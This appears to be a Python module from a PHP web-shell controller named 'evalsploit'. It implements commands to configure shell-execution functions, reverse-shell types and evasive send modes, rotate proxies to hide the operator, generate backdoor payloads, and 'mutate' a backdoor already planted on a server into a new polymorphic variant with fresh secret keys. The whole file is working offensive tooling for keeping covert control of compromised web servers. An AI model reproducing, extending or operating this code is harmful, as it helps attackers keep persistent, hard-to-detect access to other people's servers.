"""set, gen, mutate, sessions, save, connect, config."""

from __future__ import annotations

import random
from typing import TYPE_CHECKING, Callable, Optional

from evalsploit.modules.registry import register
from evalsploit.modules.base import Module, confirm_dangerous, get_styles
from evalsploit.transport.payloads import (
    generate_backdoor,
    generate_polymorphic_backdoor,
    generate_php8_backdoor,
    mutation_php,
)
from evalsploit.transport.send import validate_proxy

if TYPE_CHECKING:
    from evalsploit.context import SessionContext


# ──────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────

_HELP_OPTS = ("h", "-h", "help", "?", "/?")


def _find_working_proxy(config, test_url: Optional[str]) -> Optional[str]:
    """Try proxies (excluding current and known-dead) until one validates.
    Marks failed proxies dead with [X]. Returns working proxy or None."""
    pool = [p for p in config.proxy_list if p not in config.proxy_dead]
    current = (
        config.proxy_list[config.proxy_use_index]
        if config.proxy_use_index is not None
        else config._proxy_session
    )
    if current:
        pool = [p for p in pool if p != current]
    while pool:
        candidate = random.choice(pool)
        pool.remove(candidate)
        if validate_proxy(candidate, test_url=test_url, timeout=10):
            return candidate
        config.proxy_dead.add(candidate)
        print(f"  [X] {candidate}")
    return None


# ──────────────────────────────────────────────
# Individual setting handlers
# Each fn(ctx, setting: str) handles one 'set <key>' call
# ──────────────────────────────────────────────

def _set_run(ctx: "SessionContext", setting: str) -> None:
    c = ctx.config
    opts = ("exec", "shell_exec", "system", "passthru", "popen",
            "proc_open", "expect_popen", "pcntl_exec", "do")
    if setting in _HELP_OPTS:
        print("run:", ", ".join(opts))
        print("Current:", c.run_shell)
    elif setting in opts:
        c.run_shell = setting
        c.save_global()
        print("Set run:", setting)
    else:
        print("Unknown. set run help")


def _set_ls(ctx: "SessionContext", setting: str) -> None:
    c = ctx.config
    styles = get_styles("ls")
    if setting in _HELP_OPTS:
        print("ls:", ", ".join(styles), " | Current:", c.ls_style)
    elif setting in styles:
        c.ls_style = setting
        c.save_global()
        print("Set ls:", setting)
    else:
        print("Unknown. set ls help")


def _set_cat(ctx: "SessionContext", setting: str) -> None:
    c = ctx.config
    styles = get_styles("cat")
    if setting in _HELP_OPTS:
        print("cat:", ", ".join(styles), " | Current:", c.cat_style)
    elif setting in styles:
        c.cat_style = setting
        c.save_global()
        print("Set cat:", setting)
    else:
        print("Unknown. set cat help")


def _make_bool_handler(attr: str, name: str) -> Callable:
    """Factory: boolean on/off setting (0 or 1)."""
    def handler(ctx: "SessionContext", setting: str) -> None:
        c = ctx.config
        if setting in _HELP_OPTS:
            print(f"{name}: 0 or 1 | Current: {getattr(c, attr)}")
        elif setting in ("0", "1"):
            setattr(c, attr, setting == "1")
            c.save_global()
            print(f"Set {name}:", getattr(c, attr))
        else:
            print(f"Unknown. set {name} help")
    return handler


def _set_reverse(ctx: "SessionContext", setting: str) -> None:
    c = ctx.config
    opts = ("ivan", "monkey")
    if setting in _HELP_OPTS:
        print("reverse:", ", ".join(opts), " | Current:", c.reverse_type)
    elif setting in opts:
        c.reverse_type = setting
        c.save_global()
        print("Set reverse:", setting)
    else:
        print("Unknown. set reverse help")


def _set_send(ctx: "SessionContext", setting: str) -> None:
    c = ctx.config
    opts = ("bypass", "classic", "simple")
    if setting in _HELP_OPTS:
        print("send:", ", ".join(opts), " | Current:", c.send_mode)
    elif setting in opts:
        c.send_mode = setting
        c.save_global()
        print("Set send:", setting)
    else:
        print("Unknown. set send help")


def _set_proxy(ctx: "SessionContext", setting: str) -> None:
    c = ctx.config
    if setting in _HELP_OPTS:
        mode_str = "random" if c.proxy_use_index is None else f"#{c.proxy_use_index + 1}"
        status = "on" if c.proxy_enabled else "off"
        print("proxy: 0 | 1 | show | switch | switch N | switch random")
        print("  0 - off,  1 - on,  show - list & pick,  switch - next working proxy")
        dead_count = len(c.proxy_dead)
        validated_str = "yes" if c.proxy_list_validated else "no"
        print(f"Current: {status}, mode: {mode_str}, list: {len(c.proxy_list)}, validated: {validated_str}, dead: {dead_count}")
        return
    if setting == "0":
        c.proxy_enabled = False
        c.clear_proxy_session_cache()
        c.save_global()
        print("Proxies disabled.")
        return
    if setting == "1":
        c.proxy_enabled = True
        c.save_global()
        print("Proxies enabled.")
        return
    if setting == "show":
        if not c.proxy_list:
            print("Proxy list empty. Load in startup menu «Proxies».")
            return
        for i, px in enumerate(c.proxy_list, 1):
            print(f"  {i}. {c.proxy_status(px)} {px}")
        try:
            num_in = input(f"Number (1–{len(c.proxy_list)}, Enter to cancel): ").strip()
        except EOFError:
            return
        if not num_in:
            print("Cancelled.")
            return
        try:
            n = int(num_in)
            if 1 <= n <= len(c.proxy_list):
                proxy_str = c.proxy_list[n - 1]
                ok = validate_proxy(proxy_str, test_url=c.url or None, timeout=10)
                if not ok:
                    c.proxy_dead.add(proxy_str)
                    print(f"  [X] {proxy_str} — Warning: proxy may be dead, proceeding anyway.")
                else:
                    c.proxy_dead.discard(proxy_str)
                    print(f"  [V] {proxy_str}")
                c.proxy_use_index = n - 1
                c.proxy_enabled = True
                c.clear_proxy_session_cache()
                c.save_global()
            else:
                print("Invalid number.")
        except ValueError:
            print("Enter a number.")
        return
    if setting == "switch":
        if not c.proxy_list:
            print("Proxy list empty.")
            return
        chosen = _find_working_proxy(c, c.url or None)
        if chosen is None:
            print("All proxies dead or list empty.")
        else:
            c._proxy_session = chosen
            c.proxy_use_index = None
            c.proxy_enabled = True
            c.save_global()
            print(f"  [V] {chosen}")
        return
    if setting.startswith("switch "):
        rest = setting[7:].strip()
        if not c.proxy_list:
            print("Proxy list empty.")
            return
        if rest == "random":
            chosen = _find_working_proxy(c, c.url or None)
            if chosen is None:
                print("All proxies dead or list empty.")
            else:
                c._proxy_session = chosen
                c.proxy_use_index = None
                c.proxy_enabled = True
                c.save_global()
                print(f"  [V] {chosen}")
        elif rest.isdigit():
            n = int(rest)
            if 1 <= n <= len(c.proxy_list):
                proxy_str = c.proxy_list[n - 1]
                ok = validate_proxy(proxy_str, test_url=c.url or None, timeout=10)
                if not ok:
                    c.proxy_dead.add(proxy_str)
                    print(f"  [X] {proxy_str} — Warning: proxy may be dead, proceeding anyway.")
                else:
                    c.proxy_dead.discard(proxy_str)
                    print(f"  [V] {proxy_str}")
                c.proxy_use_index = n - 1
                c.proxy_enabled = True
                c.clear_proxy_session_cache()
                c.save_global()
            else:
                print(f"Number must be 1 to {len(c.proxy_list)}.")
        else:
            print("Use: set proxy switch N  or  set proxy switch random")
        return
    print("Unknown. set proxy help")


def _make_snippet_handler(category: str, display: Optional[str] = None) -> Callable:
    """Factory: snippet variant selection for file commands."""
    name = display or category

    def handler(ctx: "SessionContext", setting: str) -> None:
        c = ctx.config
        attr = f"snippet_{category}"
        styles = get_styles(category)
        if setting in _HELP_OPTS:
            print(f"{name}: {', '.join(styles)} | Current: {getattr(c, attr)}")
        elif setting in styles:
            setattr(c, attr, setting)
            c.save_global()
            print(f"Set {name}:", setting)
        else:
            print(f"Unknown snippet. set {name} help")
    return handler


# ──────────────────────────────────────────────
# Dispatch table: setting name → handler
# To add a new setting: write a handler fn, add one line here.
# ──────────────────────────────────────────────

_HANDLERS: dict[str, Callable] = {
    # Behavior
    "run":     _set_run,
    "ls":      _set_ls,
    "cat":     _set_cat,
    "silent":  _make_bool_handler("silent", "silent"),
    "confirm": _make_bool_handler("confirm", "confirm"),
    "reverse": _set_reverse,
    "send":    _set_send,
    "proxy":   _set_proxy,
    # Snippet variants (aliases map to the same category)
    "rm":       _make_snippet_handler("rm"),
    "del":      _make_snippet_handler("rm", "del"),
    "dl":       _make_snippet_handler("dl"),
    "download": _make_snippet_handler("dl", "download"),
    "get":      _make_snippet_handler("dl", "get"),
    "upload":   _make_snippet_handler("upload"),
    "put":      _make_snippet_handler("upload", "put"),
    "upl":      _make_snippet_handler("upload", "upl"),
    "rename":   _make_snippet_handler("rename"),
    "ren":      _make_snippet_handler("rename", "ren"),
    "mv":       _make_snippet_handler("rename", "mv"),
    "stat":     _make_snippet_handler("stat"),
    "touch":    _make_snippet_handler("touch"),
    "create":   _make_snippet_handler("mf", "create"),
    "mkf":      _make_snippet_handler("mf", "mkf"),
    "mkdir":    _make_snippet_handler("md", "mkdir"),
    "mkd":      _make_snippet_handler("md", "mkd"),
    "md":       _make_snippet_handler("md", "md"),
    "cp":       _make_snippet_handler("copy", "cp"),
}


# ──────────────────────────────────────────────
# Commands
# ──────────────────────────────────────────────

@register(
    "set",
    description="Change settings: run, ls, cat, send, proxy, silent, confirm, reverse, snippets",
    usage="set <setting> <value|help>",
)
class SetModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        if not args.strip():
            print("set <setting> <value|help>")
            print("Settings:", ", ".join(sorted(_HANDLERS)))
            return None
        parts = args.split(maxsplit=1)
        key = parts[0].lower()
        setting = parts[1].lower().strip() if len(parts) > 1 else ""
        handler = _HANDLERS.get(key)
        if handler is None:
            print(f"Unknown setting: {key!r}")
            print("Available:", ", ".join(sorted(_HANDLERS)))
            return None
        handler(ctx, setting)
        return None


@register("gen", description="Show payload variants for current Z/V params", usage="gen")
class GenModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        payloads = generate_backdoor(ctx.config.send_mode, ctx.config.Z, ctx.config.V)
        for p in payloads:
            print(p)
            print()
        return None


register("generate")(GenModule)


def _get_php_version(ctx: "SessionContext") -> Optional[str]:
    try:
        out = ctx.send("echo phpversion();")
        return out.strip().split("\n")[0].strip() if out else None
    except Exception:
        return None


def _php_major_at_least(version_str: Optional[str], major: int) -> bool:
    if not version_str:
        return False
    parts = version_str.strip().split(".")
    if not parts or not parts[0].isdigit():
        return False
    return int(parts[0]) >= major


@register("mutate", description="Mutate backdoor on server: new Z/V, new polymorphic payload", usage="mutate")
class MutateModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        if not confirm_dangerous(ctx, "mutate", "rewrite backdoor on server"):
            return None
        Zt = __import__("secrets").token_urlsafe(4)
        Vt = __import__("secrets").token_urlsafe(4)
        version = _get_php_version(ctx)
        if _php_major_at_least(version, 8):
            new_backdoor = generate_php8_backdoor(Zt, Vt)
            print(f"PHP {version or '?'} - using PHP 8 mutator (eval, no create_function).")
        else:
            new_backdoor = generate_polymorphic_backdoor(Zt, Vt)
            print(f"PHP {version or '?'} - using polymorphic mutator (create_function).")
        print("New payload (use after mutate):\n", new_backdoor, "\n")
        php = mutation_php(new_backdoor, ctx.config.Z)
        out = ctx.send(php)
        print(out)
        ctx.config.Z = Zt
        ctx.config.V = Vt
        ctx.config.save_global()
        print("Config updated to new Z, V. Use gen to see payload for other files.")
        return None


@register("sessions", description="List saved sessions", usage="sessions")
class SessionsModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        names = ctx.config.list_sessions()
        if not names:
            print("No saved sessions")
            return None
        for i, n in enumerate(names, 1):
            print(f"  {i}. {n}")
        return None


register("saved")(SessionsModule)


@register("save", description="Save current connection as a named session", usage="save <name>")
class SaveModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        if not args.strip():
            print("Usage: save <session_name>")
            return None
        name = args.strip().split()[0]
        ctx.config.save_session(name)
        print(f"Saved as session: {name}")
        return None


@register("connect", description="Load saved session and switch connection", usage="connect <name>")
class ConnectModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        if not args.strip():
            print("Usage: connect <session_name>")
            return None
        name = args.strip().split()[0]
        if not ctx.config.load_session(name):
            print("Session not found:", name)
            return None
        ctx.config.save_global()
        print(f"Connected to session: {name}")
        return None


@register("config", description="Show current settings (url, Z/V, send, proxy, snippets, etc.)", usage="config")
class ConfigShowModule(Module):
    def run(self, ctx: "SessionContext", args: str) -> Optional[str]:
        c = ctx.config
        w = 12
        print()
        print("  --- Connection ---")
        print(f"  {'url':<{w}} {c.url or '(empty)'}")
        print(f"  {'Z':<{w}} {c.Z}")
        print(f"  {'V':<{w}} {c.V}")
        print(f"  {'send_mode':<{w}} {c.send_mode}")
        print("  --- Behavior ---")
        print(f"  {'run_shell':<{w}} {c.run_shell}")
        print(f"  {'ls_style':<{w}} {c.ls_style}")
        print(f"  {'cat_style':<{w}} {c.cat_style}")
        print(f"  {'silent':<{w}} {c.silent}")
        print(f"  {'reverse_type':<{w}} {c.reverse_type}")
        print(f"  {'confirm':<{w}} {c.confirm}")
        proxy_mode = "random" if c.proxy_use_index is None else f"#{c.proxy_use_index + 1}"
        print(f"  {'proxy_enabled':<{w}} {c.proxy_enabled}")
        validated_str = "yes" if c.proxy_list_validated else "no"
        dead_count = len(c.proxy_dead)
        print(f"  {'proxy_mode':<{w}} {proxy_mode}  (list: {len(c.proxy_list)}, validated: {validated_str}, dead: {dead_count})")
        print("  --- Snippets (set X help) ---")
        for key in ("rm", "dl", "upload", "rename", "stat", "touch", "mf", "md", "copy"):
            attr = f"snippet_{key}"
            print(f"  {attr:<{w}} {getattr(c, attr, key)}")
        print()
        return None
